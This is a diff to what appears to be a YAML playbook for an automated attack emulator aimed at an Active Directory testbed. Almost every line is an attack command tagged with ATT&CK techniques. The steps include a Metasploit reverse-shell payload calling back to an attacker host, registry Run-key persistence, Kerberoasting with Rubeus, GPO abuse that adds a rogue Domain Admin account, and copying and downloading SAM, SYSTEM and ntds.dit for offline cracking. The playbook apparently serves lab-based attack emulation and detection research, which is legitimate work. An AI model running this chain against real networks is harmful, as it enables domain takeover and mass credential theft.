@@ -40,17 +40,17 @@ commands:
         LHOST: $IP_KALI
         LPORT: "9001"
     format: exe
-    local_path: $PAYLOADS_DIR/msf-9001.exe
+    local_path: $PAYLOADS_DIR/msf.exe
 
   - type: shell
     session: winrm_domain_user
     interactive: true
-    cmd: "upload $PAYLOADS_DIR/msf-9001.exe C:\\\\Users\\\\Public\\\\msf-9001.exe\n"
+    cmd: "upload $PAYLOADS_DIR/msf.exe C:\\\\Users\\\\Public\\\\msf.exe\n"
 
   - type: shell
     session: winrm_domain_user
     interactive: true
-    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Users\\Public\\msf-9001.exe\" -PropertyType \"String\" -Force\n"
+    cmd: "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Persistence\" -Value \"C:\\Users\\Public\\msf.exe\" -PropertyType \"String\" -Force\n"
     metadata:
       techniques: "T1547.001"
       tactics: "Persistence, Privilege Escalation"
@@ -69,7 +69,7 @@ commands:
   - type: shell
     session: winrm_domain_user
     interactive: true
-    cmd: "C:\\\\Users\\\\Public\\\\msf-9001.exe\n"
+    cmd: "C:\\\\Users\\\\Public\\\\msf.exe\n"
 
   - type: msf-session
     session: msfshell_local_admin
@@ -145,11 +145,14 @@ commands:
 
   - type: msf-session
     session: msfshell_local_admin
-    cmd: "execute -f C:\\\\Users\\\\Public\\\\Rubeus.exe -a \"kerberoast /nowrap\" -i" # compromise 'wsadmin'
+    cmd: "execute -f C:\\\\Users\\\\Public\\\\Rubeus.exe -a \"kerberoast /nowrap\" -i"
     metadata:
       techniques: "T1558.003"
       tactics: "Credential Access"
       technique_name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+
+  - type: debug
+    cmd: Cracking the hash of wsadmin obtained through kerberoasting offline ...
 
   - type: shell
     cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_ADMIN_USERNAME -p '$COMPROMISED_ADMIN_PASSWORD'\n"
@@ -166,79 +169,62 @@ commands:
     interactive: true
     cmd: "upload $PAYLOADS_DIR/SharpGPOAbuse.exe C:\\\\Users\\\\Public\\\\SharpGPOAbuse.exe\n"
 
-  - type: msf-payload
-    cmd: $MSF_PAYLOAD
-    payload_options:
-        LHOST: $IP_KALI
-        LPORT: "9002"
-    format: exe
-    local_path: $PAYLOADS_DIR/msf-9002.exe
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "$Username = \"$COMPROMISED_ADMIN_USERNAME\"; $Password = \"$COMPROMISED_ADMIN_PASSWORD\"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $credential;\n"
+    
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Copy-Item -Path C:\\\\Users\\\\Public\\\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\\\Users\\\\Public;\n"
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "upload $PAYLOADS_DIR/msf-9002.exe C:\\\\Users\\\\Public\\\\msf-9002.exe\n"
-
-  - type: msf-module
-    creates_session: msfshell_domain_admin
-    cmd: exploit/multi/handler
-    payload: $MSF_PAYLOAD
-    payload_options:
-      LHOST: $IP_KALI
-      LPORT: "9002"
-    background: true
-    kill_on_exit: true
-
-  - type: shell
-    session: winrm_domain_admin
-    interactive: true
-    cmd: |
-      $Username = '$COMPROMISED_ADMIN_USERNAME';
-      $Password = '$COMPROMISED_ADMIN_PASSWORD';
-      $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
-      $Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;
-      $Session = New-PSSession -ComputerName DC1 -Credential $credential;
-      Copy-Item -Path C:\\Users\\Public\\SharpGPOAbuse.exe -ToSession $Session -Destination C:\\Users\\Public\\;
-      Copy-Item -Path C:\\Users\\Public\\msf-9002.exe -ToSession $Session -Destination C:\\Users\\Public\\;
-        New-GPO -name 'revshell';
-        New-GPLINK -name 'revshell' -target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com';
-        C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName revshell --Author $COMPROMISED_ADMIN_USERNAME --TaskName 'revshell' --Command 'powershell.exe' --Arguments 'C:\\Users\\Public\\msf-9002.exe';
-      }\n
+    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output \"New-ADUser -Name mnisdfbgudfgl -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\\\Users\\\\Public\\\\useradd.ps1; Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members mnisdfbgudfgl\" >> C:\\\\Users\\\\Public\\\\useradd.ps1; New-GPO -name 'mnisdfbgudfgl'; New-GPLINK -name 'mnisdfbgudfgl' -target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\\\Users\\\\Public\\\\SharpGPOAbuse.exe --AddComputerTask --GPOName mnisdfbgudfgl --Author $COMPROMISED_ADMIN_USERNAME --TaskName 'mnisdfbgudfgl' --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\\\Users\\\\Public\\\\useradd.ps1'; gpupdate /force }\n"
     metadata:
       techniques: "T1484.001"
       tactics: "Defense Evasion, Privilege Escalation"
       technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"
-
-  - type: msf-session
-    session: msfshell_domain_admin
-    cmd: sysinfo
-
-  - type: msf-session
-    session: msfshell_domain_admin
-    cmd: getuid
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
     cmd: "upload $PAYLOADS_DIR/Invoke-NinjaCopy.ps1 C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1\n"
 
-#   - type: shell
-#     session: winrm_domain_admin
-#     interactive: true
-#     cmd: |
-#       $Username = '$COMPROMISED_ADMIN_USERNAME';
-#       $Password = '$COMPROMISED_ADMIN_PASSWORD';
-#       $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;
-#       $Credential = New-Object System.Management.Automation.PSCredential $Username, $SecurePassword;
-#       $Session = New-PSSession -ComputerName localhost -Credential $credential;
-#       C:\\Users\\Public\\Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\ntds.dit" -ComputerName DC1 -LocalDestination "C:\Users\Public\ntds.dit"
-#       # https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-NinjaCopy/Invoke-NinjaCopy.ps1
-#     metadata:
-#       techniques: "T1006"
-#       tactics: "Defense Evasion"
-#       technique_name: "Direct Volume Access"
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Copy-Item -Path C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1 -ToSession $Session -Destination C:\\\\Users\\\\Public; Invoke-Command -Session $Session -ScriptBlock { Import-Module C:\\\\Users\\\\Public\\\\Invoke-NinjaCopy.ps1; Invoke-NinjaCopy -Path \"C:\\\\Windows\\\\System32\\\\Config\\\\SAM\" -LocalDestination \"C:\\\\Users\\\\Public\\\\SAM\"; Invoke-NinjaCopy -Path \"C:\\\\Windows\\\\System32\\\\Config\\\\SYSTEM\" -LocalDestination \"C:\\\\Users\\\\Public\\\\SYSTEM\"; Invoke-NinjaCopy -Path \"C:\\\\Windows\\\\NTDS\\\\ntds.dit\" -LocalDestination \"C:\\\\Users\\\\Public\\\\ntds.dit\"; }\n"
+    metadata:
+      techniques: "T1006"
+      tactics: "Defense Evasion"
+      technique_name: "Direct Volume Access"
 
-#   - type: shell
-#     session: winrm_domain_admin
-#     interactive: true
-#     cmd: "download C:\\\\Users\\\\Public\\\\ntds.dit\n"
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Copy-Item -Path C:\\Users\\Public\\SAM -FromSession $Session -Destination C:\\Users\\Public\\; Copy-Item -Path C:\\\\Users\\\\Public\\\\SYSTEM -FromSession $Session -Destination C:\\\\Users\\\\Public; Copy-Item -Path C:\\\\Users\\\\Public\\\\ntds.dit -FromSession $Session -Destination C:\\\\Users\\\\Public;\n"
+    metadata:
+      techniques: "T1006"
+      tactics: "Defense Evasion"
+      technique_name: "Direct Volume Access"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "download C:\\\\Users\\\\Public\\\\SAM\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "download C:\\\\Users\\\\Public\\\\SYSTEM\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "download C:\\\\Users\\\\Public\\\\ntds.dit\n"
+
+  - type: debug
+    cmd: Decrypting ntds.dit offline ...
